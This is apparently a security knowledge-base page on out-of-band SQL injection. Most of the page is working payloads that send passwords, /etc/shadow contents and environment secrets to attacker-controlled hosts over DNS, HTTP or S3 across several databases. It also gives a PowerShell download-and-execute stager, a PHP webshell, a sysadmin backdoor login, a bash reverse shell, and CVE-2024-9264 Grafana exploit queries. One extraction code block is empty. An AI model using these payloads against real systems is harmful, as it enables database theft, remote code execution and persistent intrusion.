# Out-of-Band (OOB) SQL Injection

**CAT-01 > SQL Injection > Out-of-Band**

---

## Overview

Out-of-band SQL injection forces the database server to initiate an outbound network request -- DNS lookup, HTTP call, SMB connection, LDAP query, or SMTP handshake -- that carries extracted data to an attacker-controlled server over a channel entirely separate from the HTTP response. The attacker never reads the exfiltrated data from the application's HTTP body, error messages, boolean content differences, or response timing. Instead, the data arrives at a DNS listener as a subdomain label, at an HTTP server as a URL path parameter, or at an SMB listener as a UNC path component. The HTTP response the attacker receives from the web application is irrelevant. The data already left through the back door.

The mechanism depends on a fundamental architectural reality: databases are not isolated processes. They run on operating systems with network stacks, DNS resolvers, and outbound connectivity. Microsoft SQL Server ships with \`xp_dirtree\`, \`xp_fileexist\`, and \`xp_subdirs\` -- extended stored procedures that resolve UNC paths, triggering DNS lookups even before checking file permissions. Oracle Database ships with \`UTL_HTTP\`, \`UTL_INADDR\`, \`DBMS_LDAP\`, \`HTTPURITYPE\`, \`UTL_TCP\`, and \`UTL_SMTP\` -- a full suite of network client functions accessible from SQL context. PostgreSQL provides \`COPY TO PROGRAM\`, which executes arbitrary OS commands directly from a query. Even Oracle's XML parser can be weaponized: injecting an XMLType with an external DTD entity causes the parser to fetch a remote URL, leaking concatenated query results as subdomain components in the DNS lookup that precedes the HTTP connection. Every one of these functions turns the database into an HTTP client, DNS resolver, or SMB initiator -- sending data outward through a network path the application layer never monitors.

DNS is the protocol of choice for OOB exfiltration because it is almost never firewalled outbound. Port 53 UDP traffic is required for basic hostname resolution, and blocking it breaks virtually every service on the network. Even in environments with strict egress rules that block HTTP (80/443) and SMB (445), DNS resolution almost always passes through. The attacker registers a domain, points its NS records to a server they control, and captures every DNS query that arrives. When the database resolves \`admin-password-hash.attacker.com\`, that query traverses the corporate DNS resolver, exits the network, and reaches the attacker's nameserver -- carrying the extracted password in the subdomain label. The query itself is the data channel. No HTTP response is needed. No connection to the attacker's IP is visible to the application. The exfiltration happens at a layer below what WAFs, reverse proxies, and application-level logging are designed to monitor.

OOB techniques are classified as the highest-capability tier in the SQL injection hierarchy because they bypass every defensive signal that other blind techniques depend on. Boolean-based blind requires observable content differences between TRUE and FALSE responses. Time-based blind requires measurable response latency differences. Both fail against asynchronous execution architectures (queued jobs, message buses, fire-and-forget SQL), where the injected query executes after the HTTP response has already been sent. OOB injection works regardless of execution timing because the outbound request from the database is independent of the web application's response lifecycle. PortSwigger's research team explicitly notes that OAST (Out-of-Band Application Security Testing) techniques are "often preferable even in situations where other techniques for blind exploitation do work" because they have a "high chance of success" and enable "direct data exfiltration" without inference.

The real-world impact is severe and well-documented. CVE-2023-48788 (FortiClient EMS, CVSS 9.8) was exploited using MSSQL stacked queries to re-enable \`xp_cmdshell\` and establish OOB command execution -- CISA KEV listed with confirmed active exploitation. CVE-2024-43468 (Microsoft SCCM, CVSS 9.8) executes SQL as a sysadmin-level machine account, giving trivial access to all MSSQL OOB functions. CVE-2024-9264 (Grafana, CVSS 9.4) introduced an entirely new OOB vector through DuckDB's embedded SQL engine, where \`read_csv_auto()\` and the \`httpfs\` extension enable HTTP-based exfiltration from within an analytics query. The Cl0p ransomware group weaponized SQLi-to-OOB chains in two of the largest breaches in history: MOVEit Transfer (CVE-2023-34362, 8,000+ organizations) and Accellion FTA (CVE-2021-27101, 100+ organizations). In both cases, SQL injection provided initial access, and a deployed webshell served as the persistent OOB exfiltration channel -- separating the injection vector from the data theft path to evade detection.

This page completes the SQL injection series. Classic, error-based, union-based, boolean blind, and time-based blind are covered on pages 01-05. OOB is the technique that works when nothing else does.

## Understanding From Zero

### The Core Concept (No Jargon)

Imagine you are a student in a classroom taking an exam. The teacher is watching everything that comes out of your mouth -- you cannot speak answers aloud (that would be classic SQLi returning data in the response). You cannot cough in a pattern to signal letters (that would be boolean blind, changing observable behavior). You cannot take suspiciously long pauses before writing (that would be time-based blind, measurable delays).

But the teacher is not watching what happens under the desk. You tear off a corner of paper, write the answer on it, and slip it to the student sitting behind you. That student passes it backward until it reaches your friend at the back of the room. The teacher sees nothing unusual. Your mouth stayed shut. Your timing was normal. Your paper looks the same as everyone else's. But the answer left the room through a channel the teacher was not monitoring.

That is out-of-band SQL injection. The database (you) has the secret data (the answer). The application (the teacher) monitors the HTTP response (what comes out of your mouth). But the database sends the data through a DNS request (the note under the desk) to the attacker's server (your friend at the back). The application never sees it leave.

DNS is the preferred note-passing channel because it works like the school's ventilation system -- it is always running, everyone depends on it, and nobody checks what is riding on it. Blocking DNS would be like sealing the air vents -- everything in the building stops working. So the notes pass through freely, carrying database passwords encoded as subdomain labels that look like ordinary DNS queries to anyone who glances at the network traffic.

### What's Actually Happening (Technical)

The application has vulnerable code like this:

\`\`\`python
tracking_id = request.cookies.get('TrackingId')
query = f"SELECT * FROM tracking WHERE id = '{tracking_id}'"
db.execute(query)
# No output, no errors, no timing -- response is always 200 OK
\`\`\`

The attacker injects a payload that makes the database resolve an attacker-controlled domain:

\`\`\`
TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % r SYSTEM "http://'||(SELECT password FROM users
WHERE username='administrator')||'.attacker.com/"> %r;]>'),'/l') FROM dual--
\`\`\`

The Oracle database parses the XML, encounters the external DTD entity, and attempts to fetch \`http://S3cretP4ss.attacker.com/\`. This triggers a DNS lookup for \`S3cretP4ss.attacker.com\` at the attacker's nameserver. The attacker reads \`S3cretP4ss\` from the DNS query log. The HTTP response to the original web request is unchanged -- still 200 OK with the same body. The password exited through DNS.

## How It Works

\`\`\`mermaid
sequenceDiagram
    participant A as Attacker
    participant W as Web Application
    participant D as Database Server
    participant N as Attacker DNS/HTTP Server

    A->>W: HTTP Request with OOB SQLi payload
    W->>D: Execute SQL query containing OOB function
    Note over W: Returns normal HTTP response (200 OK)
    W-->>A: HTTP Response (no data, no error, no delay)

    Note over D: Database processes injected SQL
    D->>D: Executes OOB function (xp_dirtree, UTL_HTTP, etc.)
    D->>N: Outbound request (DNS/HTTP/SMB) with data in hostname/URL
    Note over N: Attacker reads exfiltrated data from request logs

    Note over A,N: Data exfiltrated via SEPARATE CHANNEL
    Note over A,N: HTTP response was irrelevant -- data arrived via DNS
\`\`\`

### Step-by-Step DNS Exfiltration Flow

1. **Attacker sets up listener**: Registers domain (e.g., \`oob.attacker.com\`), configures NS records pointing to their server, runs DNS listener on port 53
2. **Attacker injects payload**: Sends HTTP request with SQL injection that concatenates a query result into a hostname
3. **Web application executes query**: Passes the injected SQL to the database
4. **Database evaluates OOB function**: \`xp_dirtree('\\\\' + (SELECT password FROM users) + '.oob.attacker.com\\x')\` or \`UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.oob.attacker.com')\`
5. **OS DNS resolver activates**: The database host resolves \`password-value.oob.attacker.com\`
6. **DNS query traverses network**: Recursive resolver forwards the query to \`oob.attacker.com\`'s authoritative nameserver (attacker's server)
7. **Attacker captures data**: Reads \`password-value\` from the subdomain label in the DNS query log
8. **Application returns normally**: HTTP 200 OK with unchanged response body -- no trace of exfiltration in the HTTP layer

## Detection and Validation

### Phase 1: Confirm OOB Connectivity

Before extracting data, confirm the database can make outbound requests:

**MSSQL** -- inject the simplest UNC path:
\`\`\`sql
'; EXEC master..xp_dirtree '\\\\COLLABORATOR-SUBDOMAIN\\a'--
\`\`\`

**Oracle** -- inject XMLType with external entity:
\`\`\`sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % r SYSTEM "http://COLLABORATOR-SUBDOMAIN/"> %r;]>'),'/l') FROM dual--
\`\`\`

**PostgreSQL** -- inject COPY TO PROGRAM:
\`\`\`sql
'; COPY (SELECT '') TO PROGRAM 'nslookup COLLABORATOR-SUBDOMAIN'--
\`\`\`

**MySQL (Windows only)** -- inject LOAD_FILE:
\`\`\`sql
' UNION SELECT LOAD_FILE('\\\\\\\\COLLABORATOR-SUBDOMAIN\\\\a')--
\`\`\`

If a DNS/HTTP interaction appears in Burp Collaborator or interactsh, OOB connectivity is confirmed. If not, try alternative functions for the same database (see fallback chains in Detection Evasion section).

### Phase 2: Extract Data

Replace the detection payload with one that concatenates query output into the subdomain:

\`\`\`sql

-- Oracle: extract administrator password

### Phase 3: Verify Exfiltrated Data

The extracted value appears as a subdomain label in the DNS interaction log. For Burp Collaborator: check the Collaborator tab, click on the DNS interaction, and read the subdomain. For interactsh: the CLI prints the full domain including the data-bearing subdomain.

## Techniques

### Level 0: Understanding DNS as a Data Channel

DNS is the backbone of the internet's naming system. Every time any program needs to contact a hostname, the operating system performs a DNS lookup to translate that name into an IP address. This lookup is a UDP packet sent to port 53 of a DNS resolver, which recursively queries authoritative nameservers until it gets an answer.

The critical insight for OOB exfiltration: the subdomain labels in a DNS query are arbitrary strings chosen by whoever initiated the lookup. If the database resolves \`extracted-data.attacker.com\`, the string \`extracted-data\` is visible to the authoritative nameserver for \`attacker.com\` -- which the attacker controls.

**DNS label constraints** (RFC 1035):

| Constraint | Limit |
|-----------|-------|
| Max characters per label | 63 |
| Max total FQDN length | 253 |
| Max subdomain levels | 127 |
| Allowed characters | a-z, 0-9, hyphen (-) |
| Cannot start/end with | Hyphen |
| Case sensitivity | Case-insensitive |

**Practical capacity**: Hex encoding doubles data size (1 byte becomes 2 hex chars), so a 63-char label carries approximately 31 bytes of original data. Using multiple subdomain levels (\`chunk1.chunk2.chunk3.attacker.com\`), a single DNS query can carry roughly 200 characters of hex-encoded data.

**DNS caching**: DNS responses are cached by resolvers. Each exfiltration query MUST use a unique value or include a random nonce prefix to bypass caching. Otherwise, the resolver returns a cached answer and the query never reaches the attacker's nameserver.

### Level 1: Basic OOB Callbacks

#### MSSQL -- xp_dirtree DNS Callback

The simplest OOB technique. \`xp_dirtree\` is an extended stored procedure that lists directory contents. When given a UNC path (\`\\\\hostname\\share\`), it triggers a DNS lookup followed by an SMB connection. The DNS lookup happens even if the user lacks permission to list the directory.

\`\`\`sql
-- Detection only (no data)
EXEC master..xp_dirtree '\\\\attacker.com\\test'

-- Data exfiltration: current user
DECLARE @d VARCHAR(1024);
SELECT @d = SYSTEM_USER;
EXEC('master..xp_dirtree "\\\\'+@d+'.attacker.com\\x"')
\`\`\`

**Privilege**: PUBLIC role (default EXECUTE granted). No special configuration needed.

#### Oracle -- UTL_INADDR DNS Callback

\`UTL_INADDR.GET_HOST_ADDRESS\` resolves a hostname to an IP address. The hostname argument triggers a DNS lookup at the OS level.

\`\`\`sql
-- Detection only
SELECT UTL_INADDR.GET_HOST_ADDRESS('attacker.com') FROM dual

-- Data exfiltration: current user
SELECT UTL_INADDR.GET_HOST_ADDRESS(
  (SELECT user FROM dual) || '.attacker.com'
) FROM dual
\`\`\`

**Privilege**: Requires EXECUTE on UTL_INADDR and network ACL grants on Oracle 12c+.

### Level 2: Data Extraction via DNS Subdomains

#### SUBSTRING Chunking for Large Data

When the target data exceeds 63 characters (DNS label limit), extract it in chunks with sequence numbers:

**MSSQL chunked exfiltration**:
\`\`\`sql
DECLARE @data VARCHAR(4000), @c INT;
SELECT @data = (SELECT TOP 1 long_column FROM sensitive_table);
SET @c = 1;
WHILE @c <= LEN(@data)
BEGIN
  EXEC('master..xp_dirtree "\\\\' + CAST((@c/30) AS VARCHAR) + '.'
    + CONVERT(VARCHAR(60), CAST(SUBSTRING(@data, @c, 30) AS VARBINARY(30)), 2)
    + '.oob.attacker.com\\x"');
  SET @c = @c + 30;
END
\`\`\`

DNS queries arrive as:
\`\`\`
0.656d61696c5f61646472657373.oob.attacker.com    (chunk 0)
1.5f686f6d655f70686f6e65.oob.attacker.com        (chunk 1)
\`\`\`

**Oracle chunked exfiltration**:
\`\`\`sql
-- First 40 characters
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE r [ <!ENTITY % x SYSTEM "http://'
  || SUBSTR((SELECT password FROM users WHERE ROWNUM=1), 1, 40)
  || '.attacker.com/"> %x;]>'),'/l') FROM dual

-- Next 40 characters (offset 41)
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE r [ <!ENTITY % x SYSTEM "http://'
  || SUBSTR((SELECT password FROM users WHERE ROWNUM=1), 41, 40)
  || '.attacker.com/"> %x;]>'),'/l') FROM dual
\`\`\`

#### DNS-Safe Encoding

Data containing characters invalid in DNS labels (spaces, dots, special characters, uppercase) must be encoded before exfiltration:

**Hex encoding** (safest -- works everywhere):
\`\`\`sql
-- MSSQL
DECLARE @d VARCHAR(1024);
SELECT @d = CONVERT(VARCHAR(1024), CAST((SELECT TOP 1 password FROM users) AS VARBINARY(256)), 2);
EXEC('master..xp_dirtree "\\\\'+@d+'.attacker.com\\x"')

-- Oracle
SELECT RAWTOHEX(UTL_RAW.CAST_TO_RAW(
  (SELECT password FROM users WHERE ROWNUM=1)
)) FROM dual

-- MySQL
SELECT HEX((SELECT password FROM users LIMIT 1))
\`\`\`

**Reassembly on attacker side** (Python):
\`\`\`python
import binascii
data_hex = "53336372657450347373"  # from DNS query
print(binascii.unhexlify(data_hex).decode())  # -> S3cretP4ss
\`\`\`

### Level 3: Oracle XMLType XXE, OLE Automation HTTP, COPY TO PROGRAM

#### Oracle XMLType XXE -- Bypasses Network ACLs

This is the most reliable Oracle OOB vector because it operates through the XML parser's external entity resolution -- a different code path from the UTL_* network packages. On unpatched installations, it works without any network ACL grants.

\`\`\`sql
SELECT EXTRACTVALUE(
  xmltype('<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
      <!ENTITY % remote SYSTEM "http://'
      ||(SELECT password FROM users WHERE username='administrator')
      ||'.attacker.com/">
      %remote;
    ]>'),
  '/l'
) FROM dual
\`\`\`

**How the chain works**: SQL injection inserts a UNION SELECT. The \`xmltype()\` function parses the injected XML. The XML contains an external DTD entity (\`SYSTEM "http://..."\`). Oracle's XML parser fetches the external resource, triggering a DNS lookup for the hostname. The hostname contains the concatenated query result. The attacker reads it from DNS.

**Why this bypasses ACLs**: Standard Oracle OOB functions (UTL_HTTP, UTL_INADDR, DBMS_LDAP) require explicit network ACL grants since Oracle 12c. The XMLType XXE technique works through the XML parsing layer, which historically did not check ACLs. Oracle has patched this, but many installations remain unpatched.

**Multi-protocol XXE**: The external entity URL can use different protocol handlers:
- \`http://data.attacker.com/\` -- HTTP callback + DNS
- \`ftp://attacker.com/data\` -- FTP callback
- \`gopher://attacker.com/data\` -- Gopher callback
- \`\\\\attacker.com\\share\` -- SMB/UNC callback (Windows)

#### MSSQL OLE Automation -- Full HTTP Client

When \`xp_cmdshell\` is disabled but OLE Automation Procedures are enabled, MSSQL becomes a full HTTP client:

\`\`\`sql
-- Enable OLE Automation (if sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;

-- HTTP GET with exfiltrated data
DECLARE @token INT;
DECLARE @data NVARCHAR(4000);
DECLARE @url NVARCHAR(4000);
SELECT @data = (SELECT TOP 1 password FROM users);
SET @url = 'http://attacker.com/?d=' + @data;
EXEC sp_OACreate 'MSXML2.ServerXMLHTTP', @token OUT;
EXEC sp_OAMethod @token, 'open', NULL, 'GET', @url, 'false';
EXEC sp_OAMethod @token, 'send';
EXEC sp_OADestroy @token;
\`\`\`

Alternative COM objects: \`WinHttp.WinHttpRequest.5.1\` can be used instead of \`MSXML2.ServerXMLHTTP\` if the latter is blocked.

#### PostgreSQL COPY TO PROGRAM -- OS Command Execution

The most powerful PostgreSQL OOB technique. Executes arbitrary OS commands from SQL context:

\`\`\`sql
-- DNS exfiltration via nslookup
COPY (SELECT '') TO PROGRAM 'nslookup '||(SELECT current_user)||'.attacker.com'

-- HTTP exfiltration via curl
COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?d='||(SELECT current_user)

-- Reusable PL/pgSQL function for repeated exfiltration
CREATE OR REPLACE FUNCTION exfil(query TEXT) RETURNS VOID AS $$
DECLARE result TEXT; cmd TEXT;
BEGIN
  EXECUTE query INTO result;
  cmd := E'COPY (SELECT \\'\\') TO PROGRAM \\'nslookup '||result||E'.attacker.com\\'';
  EXECUTE cmd;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

SELECT exfil('SELECT current_user');
SELECT exfil('SELECT passwd FROM pg_shadow LIMIT 1');
\`\`\`

**Privilege**: Requires superuser or membership in \`pg_execute_server_program\` role (PostgreSQL 11+).

### Level 4: The Stager Technique, DuckDB Embedded OLAP OOB, Custom Listeners, DNS Binary Search

### The Stager Technique

The Stager is the most operationally significant OOB methodology. It uses OOB as a **bootstrap channel** -- not the primary exfiltration path, but a confirmation and staging mechanism that pivots to a faster, more capable channel.

**The core problem**: DNS exfiltration is slow. The 63-character label limit, hex encoding overhead, and one-query-per-value constraint make bulk data extraction impractical. Dumping a 10,000-row table through DNS subdomains could take hours and generates thousands of anomalous DNS queries. The Stager solves this by using OOB only for initial confirmation and minimal enumeration, then deploying a persistent high-bandwidth exfiltration channel.

#### Phase 1: CONFIRM (Single OOB Ping)

\`\`\`sql
-- Single DNS query confirms injection exists
'; EXEC xp_dirtree '\\\\canary.attacker.com\\x'--
\`\`\`

Result: DNS hit at attacker's nameserver. Injection confirmed. Zero data extracted.

#### Phase 2: ENUMERATE (OOB Data Per Query)

\`\`\`sql
-- Extract first table name
'; DECLARE @d VARCHAR(99)=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U');
  EXEC xp_dirtree '\\\\'+@d+'.attacker.com\\x'--
\`\`\`

Result: Table name arrives as DNS subdomain. Repeat for column names. Minimal queries (5-10 total).

#### Phase 3: STAGE (Deploy Persistent Exfiltration Channel)

**Option A -- Write a webshell** (when the web root is writable):
\`\`\`sql
'; SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/.s.php'--
\`\`\`
Now the attacker has direct command execution without further SQLi.

**Option B -- Enable xp_cmdshell and download stager** (MSSQL):
\`\`\`sql
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
  EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).DownloadString(''http://attacker.com/stage2.ps1'')'--
\`\`\`
Staged PowerShell script runs with the database service account's privileges.

**Option C -- Create a new database user with remote access**:
\`\`\`sql
'; CREATE LOGIN stager WITH PASSWORD='P@ssw0rd123';
  EXEC sp_addsrvrolemember 'stager','sysadmin';--
\`\`\`
Now connect directly to the database from outside. Full access. No more SQLi needed.

#### Phase 4: EXFILTRATE (Via Staged Channel)

Use the webshell, command shell, or direct database connection to dump everything at high speed. OOB was the initial foothold -- the staged channel handles the heavy lifting.

#### When to Use Stager vs. Pure OOB

| Scenario | Approach |
|----------|----------|
| Need 1-2 values (version, current_user) | Pure OOB -- one query per value |
| Need to dump a full table | Stager -- stage a faster channel |
| Target has egress filtering (no HTTP out) | DNS-only OOB for everything (slow but works) |
| Need persistent access for future testing | Stager -- create user or webshell |
| All OOB functions blocked by WAF | Chain: blind boolean to find writable path, then stage |

### DuckDB: The Embedded OLAP Paradigm Shift in OOB SQL Injection

> **Novel coverage.** This subsection documents a fundamental change in how OOB SQL injection works that existing resources treat as a footnote. DuckDB is not "another database with OOB functions." It is an embedded analytical engine where HTTP data access is the **primary design purpose**, not an abusable side effect. The security model that governs traditional database OOB -- network ACLs, database firewalls, privileged function revocation -- does not exist here. Everything you know about defending against OOB SQL injection assumes a client-server database. DuckDB breaks that assumption.

#### The Architectural Divide: Client-Server vs Embedded OLAP

Every traditional database OOB technique documented on this page operates within the same architectural model: a **client-server database** running as a separate process on a dedicated port, managed by a DBA, protected by network-level controls. The application connects to the database over TCP. The DBA configures who can access which functions. The network team controls which ports are open outbound. The security team monitors the database server's DNS traffic.

DuckDB operates in a fundamentally different model. It is an **embedded, in-process analytical database** -- a C++ library linked directly into the host application binary. When Grafana, dbt, Jupyter, or Metabase uses DuckDB, there is no separate database process. There is no TCP connection between "application" and "database." DuckDB executes inside the application's memory space, sharing the application's process ID, network namespace, file descriptors, environment variables, and cloud credentials. The database IS the application.

This architectural difference has five security consequences that invalidate traditional OOB defenses:

1. **No database port to firewall.** Traditional defense: block outbound connections from the database server IP. With DuckDB, the "database server" is the application server. Blocking outbound connections from the Grafana server blocks Grafana itself.

2. **No database process to monitor.** Traditional defense: alert when the database process (\`sqlservr.exe\`, \`oracle\`, \`postgres\`) makes DNS queries. With DuckDB, all network activity comes from the host process (\`grafana-server\`, \`python3\`, \`node\`). There is no distinct database process to fingerprint.

3. **No DBA to configure access controls.** Traditional defense: revoke EXECUTE on \`xp_dirtree\`, configure Oracle network ACLs, restrict \`pg_execute_server_program\`. With DuckDB, there is no DBA. The developer embedding DuckDB must explicitly set security configurations in code -- and most do not.

4. **No privilege boundary between application and database.** Traditional defense: the database connection uses a low-privilege account without \`sysadmin\` or \`FILE\` rights. With DuckDB, the database executes with the full privileges of the host process. If the application runs as root, DuckDB runs as root. If the application has an IAM role with S3 access, DuckDB inherits that role.

5. **HTTP data access is the primary feature, not an exploitable side effect.** When MSSQL's \`xp_dirtree\` triggers a DNS lookup, that is a side effect of directory listing. When Oracle's \`UTL_HTTP\` makes an HTTP request, that is an integration utility. When DuckDB's \`read_csv_auto('https://...')\` fetches a remote file, **that is the database doing exactly what it was designed to do.** The OOB vector is not a bug in DuckDB. It is DuckDB working as intended.

The analogy to SQLite is instructive but incomplete. SQLite is also embedded and in-process, but SQLite has effectively zero OOB capability -- no HTTP client, no network functions, no cloud storage integration. DuckDB is SQLite's analytical counterpart with one critical addition: **native network access as a core feature.** DuckDB was designed from the ground up to query data wherever it lives -- local files, HTTP endpoints, S3 buckets, GCS objects, Azure Blob Storage. This design choice makes DuckDB the most OOB-capable database engine in existence, while simultaneously being the hardest to defend because it lacks every traditional database security boundary.

#### DuckDB vs Traditional RDBMS OOB: The Comparison

| Dimension | Traditional RDBMS (MSSQL/Oracle/PG) | DuckDB |
|-----------|--------------------------------------|--------|
| **Architecture** | Client-server, separate process | Embedded, in-process library |
| **Network boundary** | Database port (1433/1521/5432) | None -- shares host process |
| **OOB mechanism** | Utility functions repurposed (xp_dirtree, UTL_HTTP) | Primary features (read_csv_auto, httpfs) |
| **Privilege for OOB** | Often elevated (sysadmin, DBA, FILE, superuser) | Query execution (default) |
| **Database firewall** | Exists (Oracle DB Firewall, Azure SQL FW) | Does not exist |
| **Network ACL** | Configurable (Oracle 12c+ ACLs, PG pg_hba.conf) | None -- inherits host's network stack |
| **DBA configuration** | Explicit grants required for OOB functions | No DBA; developer must set \`enable_external_access=false\` |
| **Cloud credential access** | Requires SSRF to metadata service (169.254.169.254) | Direct via credential chain provider (env vars, IAM roles, AWS config) |
| **File system access** | Limited (LOAD_FILE needs FILE priv, UTL_FILE needs directory) | Full read by default (\`read_csv_auto('/etc/passwd')\` works out of the box) |
| **Outbound protocol** | Primarily DNS/SMB (UNC), some HTTP | HTTP/HTTPS natively, S3/GCS/Azure Blob, DNS via HTTP resolution |
| **Monitoring signature** | Database process -> external DNS/HTTP | Indistinguishable from legitimate application HTTP traffic |
| **Disable OOB** | Revoke specific functions (REVOKE EXECUTE ON xp_dirtree) | Set \`enable_external_access=false\` in code (one setting) |

#### DuckDB's OOB Function Surface

DuckDB ships with a rich set of functions that enable OOB data access. These are divided into core functions (always available) and extension functions (autoloaded or manually loaded):

**Core File Reading Functions (always available, default enabled):**

| Function | Input Sources | Returns | OOB Use |
|----------|--------------|---------|---------|
| \`read_csv_auto(source)\` | Local path, HTTP URL, S3 URI | Table | Fetch attacker URL with exfil data in query param |
| \`read_csv(source, ...)\` | Same | Table | Same, with explicit column config |
| \`read_json_auto(source)\` | Local path, HTTP URL, S3 URI | Table | JSON data from attacker URL |
| \`read_parquet(source)\` | Local path, HTTP URL, S3 URI | Table | Parquet from S3 with inherited credentials |
| \`read_text(source)\` | Local path | Table (content, filename, size) | Read \`/etc/passwd\`, config files |
| \`read_blob(source)\` | Local path | Table (content as BLOB) | Read binary files, keystores, databases |
| \`COPY ... TO path\` | Local path, S3 URI | Void (writes file) | Write query results to S3 bucket |
| \`ATTACH path\` | Local path, HTTP URL, S3 URI | Database | Attach remote DuckDB databases (read-only) |
| \`getenv('VAR')\` | Environment variable name | VARCHAR | Read AWS keys, API tokens (**CLI only**) |

**httpfs Extension (autoloaded when \`https://\` or \`s3://\` URL is used):**

The \`httpfs\` extension activates automatically -- no explicit \`INSTALL\` or \`LOAD\` needed (autoloading is ON by default). It enables:
- HTTP/HTTPS read access for all \`read_*\` functions
- S3 API with full **read AND write** support, including multipart upload
- GCS access via \`gs://\` or \`gcs://\` URL schemes using HMAC keys
- Azure Blob Storage support
- AWS credential chain: environment variables -> AWS config files -> IAM instance profiles -> SSO -> STS assume-role

**Community Extensions (installable, expand OOB surface):**

| Extension | Functions | OOB Capability | Install |
|-----------|----------|----------------|---------|
| \`http_request\` | \`http_get()\`, \`http_post()\`, \`http_put()\`, \`http_patch()\`, \`http_delete()\`, \`http_post_form()\`, \`http_post_multipart()\` | **Direct OOB POST exfiltration** -- can POST arbitrary query results to attacker-controlled HTTP endpoints with custom headers. This is the most direct OOB vector. | \`INSTALL http_request FROM community\` |
| \`shellfs\` | Pipe syntax in \`read_csv('cmd \\|')\` | **Full RCE** -- executes arbitrary OS commands via pipe syntax in file reading functions | \`INSTALL shellfs FROM community\` |
| \`httpserver\` | Starts HTTP API server | Turns DuckDB into an HTTP server, enables reverse shell patterns | \`INSTALL httpserver FROM community\` |

**Critical note on community extensions:** Community extensions are built and signed by the DuckDB build infrastructure, but the source code comes from third-party developers with **no pre-submission code review by DuckDB**. The \`allow_community_extensions\` setting (default: \`true\`) controls whether they can be loaded.

#### The Columnar Exfiltration Advantage

DuckDB's OLAP architecture provides a bulk data processing capability that traditional row-oriented RDBMS OOB lacks. Traditional OOB extracts data character-by-character (DNS binary search), row-by-row (hex-encoded subdomains), or through slow chunked queries. DuckDB's analytical engine can:

1. **Aggregate entire tables into a single value** using \`string_agg()\` or \`list()\`, then embed the result in a single HTTP request URL parameter
2. **Write full query results to S3** using \`COPY ... TO 's3://bucket/dump.parquet'\` with columnar Parquet compression -- orders of magnitude faster than DNS-based exfiltration
3. **Join across local files and remote sources** in a single query -- reading \`/etc/passwd\` and correlating with data from an internal S3 bucket, then exfiltrating the combined result
4. **Process data locally before exfiltration** using DuckDB's full analytical SQL (window functions, CTEs, aggregations) to extract only the high-value records, reducing exfiltration volume and detection risk

Where MSSQL OOB via \`xp_dirtree\` DNS subdomains extracts ~30 bytes per query (limited by DNS label length), a single DuckDB \`COPY ... TO 's3://...'\` command can exfiltrate gigabytes of data in a Parquet-compressed columnar format. The speed difference is not incremental -- it is categorical.

#### CVE-2024-9264: Grafana SQL Expressions -- Complete Analysis

| Field | Value |
|-------|-------|
| **CVE** | CVE-2024-9264 |
| **Product** | Grafana OSS and Enterprise (observability platform) |
| **CVSS 3.1** | **9.9 Critical** (Grafana CNA) / 8.8 High (NIST) |
| **CVSS 4.0** | **9.4 Critical** (Grafana CNA) |
| **CWE** | CWE-77 (Command Injection), CWE-94 (Code Injection) |
| **Affected** | 11.0.0-11.0.5, 11.1.0-11.1.6, 11.2.0-11.2.1 |
| **Fixed** | 11.0.6+security-01, 11.1.7+security-01, 11.2.2+security-01 |
| **Access** | Viewer role (lowest authenticated role in Grafana) |
| **Prerequisite** | DuckDB CLI binary installed on Grafana server and in \`$PATH\` |
| **Reporter** | Internal Grafana Labs engineer |

**How the Vulnerability Worked:**

Grafana 11.x introduced "SQL Expressions" -- an experimental feature that allowed users to post-process data source query results using SQL. The implementation passed user-supplied SQL expressions to the **DuckDB CLI binary** (\`duckdb\`) as an external process via \`exec.Command\`. The user's SQL was not sanitized against DuckDB-specific functions.

**The attack flow:**

\`\`\`
Grafana Viewer (lowest auth) 
  -> POST /api/ds/query?ds_type=__expr__&expression=true
    -> JSON body: {"type": "sql", "expression": "<MALICIOUS SQL>"}
      -> Grafana passes expression to DuckDB CLI process
        -> DuckDB executes with Grafana server's OS privileges
          -> Arbitrary file read, HTTP OOB exfil, RCE
\`\`\`

**Exploitation payloads (verified from public PoCs):**

\`\`\`sql
-- Arbitrary file read (CVE-2024-9264 primary impact)
SELECT content FROM read_blob('/etc/passwd')
SELECT * FROM read_csv_auto('/etc/passwd')

-- Environment variable extraction (DuckDB CLI only)
SELECT getenv('GRAFANA_DATABASE_URL')
SELECT getenv('AWS_SECRET_ACCESS_KEY')
SELECT getenv('GF_SECURITY_ADMIN_PASSWORD')

-- OOB exfiltration: file content to attacker via HTTP
SELECT * FROM read_csv_auto(
  'http://attacker.com/exfil?data=' || (
    SELECT string_agg(content, ',') FROM read_text('/etc/passwd')
  )
)

-- OOB exfiltration: query results to attacker S3 bucket
COPY (SELECT * FROM read_csv_auto('/etc/shadow'))
  TO 's3://attacker-bucket/grafana-shadow.parquet' (FORMAT PARQUET)

-- Direct HTTP POST exfiltration via community extension
INSTALL http_request FROM community; LOAD http_request;
SELECT * FROM http_post(
  'http://attacker.com/exfil',
  (SELECT content FROM read_blob('/etc/grafana/grafana.ini')),
  'text/plain'
)

-- RCE via shellfs community extension
INSTALL shellfs FROM community; LOAD shellfs;
SELECT * FROM read_csv('bash -c "sh -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" |')

-- Cloud credential theft via IMDS (if Grafana runs on EC2/GCE)
SELECT * FROM read_csv_auto(
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
)
\`\`\`

